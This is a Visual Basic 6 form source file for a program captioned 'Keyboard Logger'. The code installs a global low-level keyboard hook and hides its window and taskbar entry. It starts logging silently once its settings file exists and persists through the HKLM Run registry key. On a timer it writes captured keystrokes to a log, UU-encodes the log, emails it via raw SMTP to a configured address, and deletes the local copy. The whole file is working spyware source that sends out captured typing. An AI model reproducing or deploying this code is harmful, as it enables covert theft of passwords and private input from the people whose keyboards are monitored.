VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmKeybd 
   BackColor       =   &H00DCEFEC&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Keyboard Logger"
   ClientHeight    =   6465
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   5970
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   9.75
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6465
   ScaleWidth      =   5970
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock wskSendMail 
      Left            =   4020
      Top             =   5370
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Interval        =   60000
      Left            =   3600
      Top             =   5370
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H00DCEFEC&
      Caption         =   "Other Setting"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800000&
      Height          =   1695
      Left            =   120
      TabIndex        =   21
      Top             =   4680
      Width           =   4545
      Begin GlobalHook.xpcheckbox chkStartUp 
         Height          =   435
         Left            =   1500
         TabIndex        =   22
         ToolTipText     =   "Load as system start"
         Top             =   1020
         Width           =   1635
         _ExtentX        =   2884
         _ExtentY        =   767
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Value           =   1
         Caption         =   "Load at Startup"
         BackColor       =   14479340
         ForeColor       =   7159618
      End
      Begin GlobalHook.xpcheckbox chkUseEmail 
         Height          =   435
         Left            =   1500
         TabIndex        =   23
         ToolTipText     =   "Load as system start"
         Top             =   510
         Width           =   1635
         _ExtentX        =   2884
         _ExtentY        =   767
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Value           =   1
         Caption         =   "Email &Me"
         BackColor       =   14479340
         ForeColor       =   7159618
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00DCEFEC&
      Caption         =   "Email Setting"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800000&
      Height          =   2145
      Left            =   150
      TabIndex        =   12
      Top             =   2430
      Width           =   5655
      Begin VB.TextBox txtEmail 
         ForeColor       =   &H00000040&
         Height          =   360
         Left            =   1590
         TabIndex        =   19
         ToolTipText     =   "You must provide a valid e-mail address to whom the logged file will be sent"
         Top             =   1140
         Width           =   3855
      End
      Begin VB.TextBox txtSMTP 
         ForeColor       =   &H00000040&
         Height          =   360
         Left            =   1590
         TabIndex        =   15
         ToolTipText     =   "SMTP host name. eg: mail.hotpop.com"
         Top             =   540
         Width           =   3855
      End
      Begin VB.TextBox txtHour 
         ForeColor       =   &H00000040&
         Height          =   360
         Left            =   1590
         MaxLength       =   2
         TabIndex        =   14
         Text            =   "1"
         Top             =   1650
         Width           =   345
      End
      Begin VB.VScrollBar vsrlHour 
         Height          =   345
         Left            =   1920
         Max             =   0
         Min             =   25
         TabIndex        =   13
         Top             =   1650
         Value           =   1
         Width           =   195
      End
      Begin VB.Label Label7 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Email Add     :"
         ForeColor       =   &H006D3F42&
         Height          =   240
         Left            =   210
         TabIndex        =   20
         Top             =   1140
         Width           =   1230
      End
      Begin VB.Label Label6 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SMTP Host    :"
         ForeColor       =   &H006D3F42&
         Height          =   240
         Left            =   210
         TabIndex        =   18
         Top             =   570
         Width           =   1245
      End
      Begin VB.Label Label5 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Time Interval :"
         ForeColor       =   &H006D3F42&
         Height          =   240
         Left            =   180
         TabIndex        =   17
         Top             =   1680
         Width           =   1275
      End
      Begin VB.Label Label4 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Hour(s)"
         ForeColor       =   &H006D3F42&
         Height          =   240
         Left            =   2160
         TabIndex        =   16
         Top             =   1680
         Width           =   645
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00DCEFEC&
      Caption         =   "File Setting"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800000&
      Height          =   2145
      Left            =   150
      TabIndex        =   4
      Top             =   180
      Width           =   5625
      Begin GlobalHook.MyButton cmdFile 
         Height          =   345
         Left            =   5130
         TabIndex        =   7
         ToolTipText     =   "Click to browse for a file"
         Top             =   540
         Width           =   315
         _ExtentX        =   556
         _ExtentY        =   609
         BTYPE           =   8
         TX              =   "..."
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   0   'False
         BCOL            =   14479340
         BCOLO           =   13363170
         FCOL            =   7159618
         FCOLO           =   16711680
         MCOL            =   13363170
         MPTR            =   1
         MICON           =   "frmMain.frx":0442
         UMCOL           =   0   'False
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   -1  'True
         FX              =   3
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.VScrollBar vsrlMin 
         Height          =   345
         Left            =   1950
         Max             =   0
         Min             =   21
         TabIndex        =   10
         Top             =   1080
         Value           =   5
         Width           =   195
      End
      Begin VB.TextBox txtInterval 
         ForeColor       =   &H00000040&
         Height          =   360
         Left            =   1620
         MaxLength       =   2
         TabIndex        =   9
         Text            =   "5"
         Top             =   1080
         Width           =   345
      End
      Begin VB.TextBox txtFileName 
         ForeColor       =   &H00000040&
         Height          =   360
         Left            =   1620
         TabIndex        =   6
         Top             =   540
         Width           =   3525
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Min(s)"
         ForeColor       =   &H006D3F42&
         Height          =   240
         Left            =   2190
         TabIndex        =   11
         Top             =   1110
         Width           =   540
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Time Interval :"
         ForeColor       =   &H006D3F42&
         Height          =   240
         Left            =   210
         TabIndex        =   8
         Top             =   1110
         Width           =   1275
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "File Name     :"
         ForeColor       =   &H006D3F42&
         Height          =   240
         Left            =   240
         TabIndex        =   5
         Top             =   570
         Width           =   1230
      End
   End
   Begin VB.TextBox txtKeyCode 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   5565
      Left            =   6150
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      Top             =   270
      Visible         =   0   'False
      Width           =   8895
   End
   Begin GlobalHook.MyButton cmdStart 
      Height          =   345
      Left            =   4800
      TabIndex        =   1
      Top             =   4860
      Width           =   945
      _ExtentX        =   1667
      _ExtentY        =   609
      BTYPE           =   5
      TX              =   "S&tart"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   0   'False
      BCOL            =   13363170
      BCOLO           =   14479340
      FCOL            =   7159618
      FCOLO           =   16744576
      MCOL            =   13363170
      MPTR            =   1
      MICON           =   "frmMain.frx":045E
      UMCOL           =   0   'False
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   -1  'True
      FX              =   1
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin GlobalHook.MyButton cmdStop 
      Height          =   345
      Left            =   4800
      TabIndex        =   2
      Top             =   5220
      Width           =   945
      _ExtentX        =   1667
      _ExtentY        =   609
      BTYPE           =   5
      TX              =   "&Stop"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   0   'False
      BCOL            =   13363170
      BCOLO           =   14479340
      FCOL            =   7159618
      FCOLO           =   16744576
      MCOL            =   13363170
      MPTR            =   1
      MICON           =   "frmMain.frx":047A
      UMCOL           =   0   'False
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   -1  'True
      FX              =   1
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin GlobalHook.MyButton cmdExit 
      Height          =   345
      Left            =   4800
      TabIndex        =   3
      Top             =   5940
      Width           =   945
      _ExtentX        =   1667
      _ExtentY        =   609
      BTYPE           =   5
      TX              =   "&Exit"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   0   'False
      BCOL            =   13363170
      BCOLO           =   14479340
      FCOL            =   7159618
      FCOLO           =   16744576
      MCOL            =   13363170
      MPTR            =   1
      MICON           =   "frmMain.frx":0496
      UMCOL           =   0   'False
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   -1  'True
      FX              =   1
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin GlobalHook.MyButton cmdApply 
      Height          =   345
      Left            =   4800
      TabIndex        =   24
      Top             =   5580
      Width           =   945
      _ExtentX        =   1667
      _ExtentY        =   609
      BTYPE           =   5
      TX              =   "&Apply"
      ENAB            =   0   'False
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   0   'False
      BCOL            =   13363170
      BCOLO           =   14479340
      FCOL            =   7159618
      FCOLO           =   16744576
      MCOL            =   13363170
      MPTR            =   1
      MICON           =   "frmMain.frx":04B2
      UMCOL           =   0   'False
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   -1  'True
      FX              =   1
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
End
Attribute VB_Name = "frmKeybd"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Enum SMTP_State
    MAIL_CONNECT
    MAIL_HELO
    MAIL_FROM
    MAIL_RCPTTO
    MAIL_DATA
    MAIL_DOT
    MAIL_QUIT
End Enum

Dim SaveControler As Integer
Dim EmailControler As Integer
Dim HourControler As Integer
Private m_State As SMTP_State
Private m_strEncodedFiles As String
'


Private Sub chkStartUp_Click()
    If Not cmdApply.Enabled Then cmdApply.Enabled = True
End Sub

Private Sub chkUseEmail_Click()
    If Not cmdApply.Enabled Then cmdApply.Enabled = True
    
End Sub

Private Sub cmdApply_Click()
    If chkUseEmail.Value = Checked Then
        If Len(Trim(txtSMTP)) <= 0 And Len(Trim(txtEmail)) <= 0 Then
            MsgBox "Please provide SMTP Host name and your email address."
            cmdApply.Enabled = False
            txtSMTP.SetFocus
            Exit Sub
        ElseIf Len(Trim(txtSMTP)) <= 0 Then
            MsgBox "Please provide SMTP Host name."
            cmdApply.Enabled = False
            txtSMTP.SetFocus
            Exit Sub
        ElseIf Len(Trim(txtEmail)) <= 0 Then
            MsgBox "Please provide your email address."
            cmdApply.Enabled = False
            txtEmail.SetFocus
            Exit Sub
        Else
            SMTPHostName = txtSMTP.Text
            EmailAdd = txtEmail.Text
            EmailInterval = txtHour.Text
            UseEmail = 1
        End If
    Else
        SMTPHostName = Chr(1)
        EmailAdd = Chr(1)
        EmailInterval = 0
        UseEmail = 0
    End If
    If Len(Trim(txtFileName)) <= 0 Then
        MsgBox "Please provide a filename."
        cmdApply.Enabled = False
        txtFileName.SetFocus
        Exit Sub
    Else
        FileName = Trim(txtFileName)
    End If
    If (chkStartUp.Value <> StartUp) Then
        Dim IRtvalue, vValue As Variant, HKEY As Long
        
        If chkStartUp.Value = Unchecked Then
            IRtvalue = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, HKEY)
            If IRtvalue = ERROR_NONE Then
                IRtvalue = RegDeleteValue(HKEY, "KeyBoard")
                RegCloseKey (HKEY)
            End If
            '
            '   If not run on start up please insert the same value in HKEY_CURRENT_USER
            '
            
        ElseIf chkStartUp.Value = Checked Then
            SetKeyValueC "Software\Microsoft\Windows\CurrentVersion\Run", "KeyBoard", App.Path & "\" & App.EXEName & ".exe", REG_SZ
        End If
    End If
    
    SaveInterval = txtInterval
    If chkStartUp.Value = Checked Then
        StartUp = 1
    Else
        StartUp = 0
    End If
    Dim strDataToStore As String
    
    strDataToStore = StartUp & Chr(2) & UseEmail & Chr(2) _
                     & FileName & Chr(2) & SaveInterval & Chr(2) _
                     & SMTPHostName & Chr(2) & EmailAdd & Chr(2) & EmailInterval
                     
    
    strDataToStore = Encrypt(strDataToStore)
    If Dir(App.Path & "\key.dat") <> "" Then
        Kill App.Path & "\key.dat"
    End If
    Open App.Path & "\key.dat" For Binary As #1
        Put #1, , strDataToStore
    Close #1
    cmdApply.Enabled = False
    If Not Timer1.Enabled Then Timer1.Enabled = True
End Sub

Private Sub cmdExit_Click()
    If cmdStop.Enabled Then
        Me.Visible = False
    Else
        Unload Me
    End If
End Sub

Private Sub cmdFile_Click()
    Dim FolderName As String
    FolderName = GetFolderName(Me.hwnd, "Please select a folder where you want to save the log file")
    If Len(FolderName) > 0 Then txtFileName = FolderName & "\" & "keyhook.log"
End Sub

Private Sub cmdStart_Click()
    cmdStop.Enabled = True
    cmdStart.Enabled = False
    cmdExit.Caption = "Hide"
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf GetKey, App.hInstance, 0)
End Sub

Private Sub cmdStop_Click()
    cmdExit.Caption = "Exit"
    cmdStop.Enabled = False
    cmdStart.Enabled = True
    UnhookWindowsHookEx hook
End Sub

Private Sub Form_Load()
    
    Dim reply
    Dim spltArray
    If App.PrevInstance Then
        'reply = MsgBox("This program is already running. Do you want to run another instance of this porgram ?", vbSystemModal Or vbYesNo Or vbQuestion, "AutoShutdown" & " v" & App.Major & "." & App.Minor & "." & App.Revision)
        'If reply = vbNo Then
            Unload Me
            Exit Sub
        'End If
    End If
    App.TaskVisible = False
    
    ' Find preINI File
    ' If exist load the settings and load the frmkeybd with visible=false
    ' else load the frmkeybd with visible=true and dont hook
    
    If Dir(App.Path & "\key.dat") <> "" Then
        Dim fileBuff As String
        Open App.Path & "\key.dat" For Binary As #1
            fileBuff = String(LOF(1), " ")
            Get #1, , fileBuff
        Close #1
        fileBuff = Decrypt(fileBuff)
        
        spltArray = Split(fileBuff, Chr(2))
        
        StartUp = spltArray(0)
        If StartUp = 1 Then
            chkStartUp.Value = Checked
        Else
            chkStartUp.Value = Unchecked
        End If
        
        UseEmail = spltArray(1)
        If UseEmail = 1 Then
            chkUseEmail.Value = Checked
        Else
            chkUseEmail.Value = Unchecked
        End If
        
        FileName = spltArray(2)
        txtFileName.Text = FileName
        
        SaveInterval = spltArray(3)
        txtInterval.Text = SaveInterval
        
        If StrComp(spltArray(4), Chr(1), vbBinaryCompare) = 0 Then  ' no SMTP Host found
            SMTPHostName = ""
            txtSMTP.Text = ""
        Else
            SMTPHostName = spltArray(4)
            txtSMTP.Text = spltArray(4)
        End If
        
        If StrComp(spltArray(5), Chr(1), vbBinaryCompare) = 0 Then  ' no email address found
            EmailAdd = ""
            txtEmail.Text = ""
        Else
            EmailAdd = spltArray(5)
            txtEmail.Text = spltArray(5)
        End If
        
        If StrComp(spltArray(6), "0", vbTextCompare) = 0 Then       ' no email-sending interval found
            txtHour.Text = 1
            EmailInterval = 0
        Else
            txtHour.Text = spltArray(6)
            EmailInterval = spltArray(6)
        End If
        Me.Visible = False
        cmdExit.Caption = "Hide"
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf GetKey, App.hInstance, 0)
        cmdStart.Enabled = False
        cmdStop.Enabled = True
        Timer1.Enabled = True
    Else
        Me.Visible = True
        cmdExit.Caption = "Exit"
        cmdStart.Enabled = True
        cmdStop.Enabled = False
        Timer1.Enabled = False
    End If
    cmdApply.Enabled = False
    SaveControler = 0
    EmailControler = 0
    HourControler = 0
End Sub



Private Sub Form_Unload(Cancel As Integer)
    UnhookWindowsHookEx hook
End Sub


Private Sub Timer1_Timer()
    SaveControler = SaveControler + 1
    If SaveControler = SaveInterval Then
        SaveControler = 0
        If Len(txtKeyCode.Text) > 0 Then
            Open FileName For Append As #1
                Print #1, txtKeyCode.Text
            Close #1
        End If
        txtKeyCode.Text = ""
    End If
    If (UseEmail) Then
        HourControler = HourControler + 1
        If HourControler = 60 Then
            EmailControler = EmailControler + 1
            HourControler = 0
        End If
        If EmailControler = EmailInterval Then
            EmailControler = 0
            HourControler = 0
            SendEmail
        End If
    End If
    
End Sub

Private Sub txtEmail_Change()
    If chkUseEmail.Value = Checked Then
        cmdApply.Enabled = True
    End If
End Sub

Private Sub txtFileName_Change()
    If Not cmdApply.Enabled Then
        cmdApply.Enabled = True
    End If
End Sub

Private Sub txtHour_Change()
    If txtHour.Text <= 0 Then txtInterval.Text = 1
    If txtHour.Text > 24 Then txtInterval.Text = 24
    vsrlHour.Value = txtHour.Text
    If chkUseEmail.Value = Checked Then
        cmdApply.Enabled = True
    End If
End Sub

Private Sub txtInterval_Change()
    If txtInterval.Text <= 0 Then txtInterval.Text = 1
    If txtInterval.Text >= 21 Then txtInterval.Text = 20
    vsrlMin.Value = txtInterval.Text
    If Not cmdApply.Enabled Then
        cmdApply.Enabled = True
    End If
End Sub

Private Sub txtSMTP_Change()
    If chkUseEmail.Value = Checked Then
        cmdApply.Enabled = True
    End If
End Sub

Private Sub vsrlHour_Change()
    If vsrlHour.Value = 25 Then
        vsrlHour.Value = 1
    End If
    If vsrlHour.Value = 0 Then
        vsrlHour.Value = 24
    End If
    txtHour.Text = vsrlHour.Value
End Sub

Private Sub vsrlMin_Change()
    If vsrlMin.Value = 21 Then
        vsrlMin.Value = 1
    End If
    If vsrlMin.Value = 0 Then
        vsrlMin.Value = 20
    End If
    txtInterval.Text = vsrlMin.Value
End Sub

Private Function Encrypt(strData As String) As String
    Dim i As Long
    Dim buffer As String
    Dim AsciiBuff As Long
    For i = 1 To Len(strData)
        buffer = Mid(strData, i, 1)
        AsciiBuff = Asc(buffer) + Len(strData)
        Encrypt = Encrypt & Chr(AsciiBuff)
    Next i
End Function

Private Function Decrypt(strData As String) As String
    Dim i As Long
    Dim buffer As String
    Dim AsciiBuff As Long
    
    For i = 1 To Len(strData)
        buffer = Mid(strData, i, 1)
        AsciiBuff = Asc(buffer) - Len(strData)
        Decrypt = Decrypt + Chr(AsciiBuff)
    Next i
End Function

Private Sub SendEmail()
    Dim strServer As String, ColonPos As Integer, lngPort As Long
    
    m_strEncodedFiles = UUEncodeFile(FileName) & vbCrLf
    
    strServer = Trim(SMTPHostName)
    ColonPos = InStr(strServer, ":")
    If Len(strServer) Then
        If ColonPos = 0 Then
            'no proxy so use standard SMTP port
            'wskSendMail.Close
            wskSendMail.Connect strServer, 25
        Else
            'Proxy, so get proxy port number and parse out the server name or IP address
            lngPort = CLng(Right$(strServer, Len(strServer) - ColonPos))
            strServer = Left$(strServer, ColonPos - 1)
            wskSendMail.Connect strServer, lngPort
        End If
    End If
    m_State = MAIL_CONNECT
End Sub

Private Sub wskSendMail_DataArrival(ByVal bytesTotal As Long)
    Dim strServerResponse   As String
    Dim strResponseCode     As String
    Dim strDataToSend       As String
    Dim strMessage          As String
    wskSendMail.GetData strServerResponse
    
    'Get server response code (first three symbols)
    strResponseCode = Left(strServerResponse, 3)
    '
    'Only these three codes tell us that previous
    'command accepted successfully and we can go on
    '
    If strResponseCode = "250" Or _
        strResponseCode = "220" Or _
        strResponseCode = "354" Then
       
        Select Case m_State
            
            Case MAIL_CONNECT
                m_State = MAIL_HELO
                strDataToSend = "KeyBoard Monitor"
                wskSendMail.SendData "HELO " & strDataToSend & vbCrLf
                
            Case MAIL_HELO
                m_State = MAIL_FROM
                wskSendMail.SendData "MAIL FROM:" & Trim$(txtEmail) & vbCrLf
                
            Case MAIL_FROM
                m_State = MAIL_RCPTTO
                wskSendMail.SendData "RCPT TO:" & Trim$(txtEmail) & vbCrLf
            
            Case MAIL_RCPTTO
                m_State = MAIL_DATA
                wskSendMail.SendData "DATA" & vbCrLf
                
            Case MAIL_DATA
                m_State = MAIL_DOT
                strDataToSend = "Content-type: text/plain" & vbCrLf
                wskSendMail.SendData strDataToSend
                strDataToSend = "From:" & "KeyBoard Monitor" & " <" & "********" & ">" & vbCrLf
                wskSendMail.SendData strDataToSend
                wskSendMail.SendData "To:" & "Nazmul Alam" & " <" & txtEmail & ">" & vbCrLf  'Nazmul Alam may be replaced by the user name
                strDataToSend = "Global Keyboard Monitor Result"
                wskSendMail.SendData "Subject:" & strDataToSend & vbCrLf & vbCrLf
                strMessage = "Global keyboard monitor returns the following key(s)" & vbCrLf & vbCrLf & m_strEncodedFiles
                m_strEncodedFiles = ""
                wskSendMail.SendData strMessage & vbCrLf
                strMessage = ""
                wskSendMail.SendData "." & vbCrLf
                
            Case MAIL_DOT
                m_State = MAIL_QUIT
                wskSendMail.SendData "QUIT" & vbCrLf
                
            Case MAIL_QUIT
                wskSendMail.Close
            
        End Select
    Else
        wskSendMail.Close
        If Not m_State = MAIL_QUIT Then
'            Debug.Print "SMTP Error: " & strServerResponse, _
'                    vbInformation, "SMTP Error"
        Else
'            Debug.Print "Message sent successfully.", vbInformation
            Kill FileName
        End If
        '
    End If
                
End Sub

Private Sub wskSendMail_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
'    Debug.Print "Mail send error" & "ErrorNumber: " & Number & "Description: " & Description
End Sub
